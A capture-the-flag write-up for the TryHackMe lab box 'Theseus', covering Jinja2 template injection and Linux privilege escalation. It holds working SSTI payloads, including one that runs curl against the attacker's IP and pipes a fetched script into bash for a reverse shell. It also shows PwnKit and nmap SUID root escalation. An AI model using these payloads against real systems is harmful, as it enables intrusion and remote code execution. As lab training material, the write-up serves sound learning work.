---
title: "Theseus"
type: docs
tags:
  - thm
  - linux
  - insane
  - ssti
  - jinja2
  - pwnkit
  - gtfobins
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Insane, **IP:** 10.10.167.63

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Flask/Werkzeug app on `:8080` (Python 2.7). An obfuscated hint on the page decodes to *"…make use of the `?key` …"*.
2. `arjun` confirms the `key` parameter → **Jinja2 SSTI** (`{{7*7}}` → `49`).
3. Escalate SSTI to RCE (`SSTImap --os-shell`, or a `__globals__` payload) → shell as **minos**; recover `entrance:Knossos` from a home file → `sudo -u entrance`.
4. Root either via **PwnKit (CVE-2021-4034)** or the intended path: **`nmap` is SUID** → [GTFOBins nmap SUID](https://gtfobins.github.io/gtfobins/nmap/#suid).

</div>

---

## Full Walkthrough

### Nmap scan

```bash
Nmap scan report for theseus.thm (10.10.167.63)
Host is up, received user-set (0.086s latency).
Scanned at 2025-05-19 23:18:39 EDT for 15s
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 2.7.17)
| http-headers: 
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 1247
|   Server: Werkzeug/1.0.1 Python/2.7.17
|   Date: Tue, 20 May 2025 03:18:53 GMT
|   
|_  (Request type: HEAD)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The encoded message on the webpage `http://theseus.thm:8080/` `TGUE?O, S, K, MTUEGI, SYENFE, TOI,, SRO, T, SF, OYT,, O, T, KUMH, I, AE, NMK, ` decodes into the following.

```bash
TO·GET·TO·KING·MINOS·YOU·MUST·FIRST·MAKE·USE·OF·THE·?KEY·········
```

![Pasted image 20250519232350](Pasted-image-20250519232350.png)![Pasted image 20250519232613](Pasted-image-20250519232613.png)

I trued using key as a parameter and it seems to display what is in the query on the webpage I am going to attempt to fuzz for more information. I tried using `cewl` to make a wordlist from the website and fuzz.

```bash
cewl http://theseus.thm:8080/ -w wordlist.lst
```

Did not get anywhere also tried to see if the image on the website was a stego file got nothing.

I tried looking for other parameters as well..
```bash
└─[$] arjun -u http://theseus.thm:8080/                                                                                           [0:14:10]
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: key, based on: body length
[+] Parameters found: key
```

Since the http server is running python I tried template injection and was able to get it to work!

```http
GET /?key={{+7*7+}} HTTP/1.1
Host: theseus.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Tue, 20 May 2025 04:15:36 GMT

49
```

```bash
python3 ~/SSTImap/sstimap.py -u "http://theseus.thm:8080/?key=test" --os-shell -l 5 -e jinja2
```

![Pasted image 20250520001939](Pasted-image-20250520001939.png)

### First flag

```bash
posix-linux2 $ cat /home/minos/Minos_Flag
THM{499a89a2a064426921732e7d31bc08a}
```

![Pasted image 20250520003011](Pasted-image-20250520003011.png)

```bash
69022 -rw-r--r-- 1 minos minos 960 Aug 20  2020 /home/minos/Crete_Shores
posix-linux2 $ cat /home/minos/Crete_Shores
Theseus insisted he knew the dangers but
would succeed in his journey to Crete. 
As the ship left the harbour wall he 
shouted to his father King Aegeus "and 
you will be proud of your son".

"Then I wish you luck, my son, I shall
watch for you every day. If you are
successful, take down these black sails
and replace them with white ones. That way 
I will know you are coming safe to me."

As the ship docked in Crete, King Minos himself
came down to inspect the prisoners from Athens.
He enjoyed the chance to taunt the Athenians
and to humiliate them even further.

As King Minos jeered as to who would enter the
labyrinth first, Theseus stepped forward.

"I will go first. I am Theseus, Prince of Athens,
and I do not fear what is within the walls of
your maze."

"Those are brave words for one so young and 
feeble, but the Minotaur will soon have you
between its horns. Guards, open the labyrinth
and let him in!"

Username: entrance
Password: Knossos
posix-linux2 $ sudo -u entrance whoami
```

I was able to modify the request to get a reverse shell.


```http
GET /?key={{request.application.__globals__.__builtins__.__import__('os').popen('curl+10.21.23.235:8000/shell+|+bash').read()}} HTTP/1.1
Host: theseus.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

![Pasted image 20250520003631](Pasted-image-20250520003631.png)

#### Getting root

the system is vulnerable to the `PwnKit` Exploit once I uploaded the compiled exploit and executed it I got root.

![Pasted image 20250520003708](Pasted-image-20250520003708.png)

#### Escalating Privileges the intended way

![Pasted image 20250520003827](Pasted-image-20250520003827.png)

We can see that `nmap` is set as a SUID binary we can visit [This GTFO Bins page](https://gtfobins.github.io/gtfobins/nmap/#suid) to see how to privesc using `nmap` as `SUID`.

#### How to privesc using nmap SUID

```bash
(remote) minos@Minos:/tmp$ echo 'os.execute("/bin/sh")' > $TF
(remote) minos@Minos:/tmp$ sudo nmap --script=$TF

Starting Nmap 7.60 ( https://nmap.org ) at 2025-05-20 04:44 UTC
NSE: Warning: Loading '/tmp/tmp.CeE8tiLMAk' -- the recommended file extension is '.nse'.
\[\](remote)\[\] \[\]root@Minos\[\]:\[\]/tmp\[\]$ 
```

![Pasted image 20250520004548](Pasted-image-20250520004548.png)
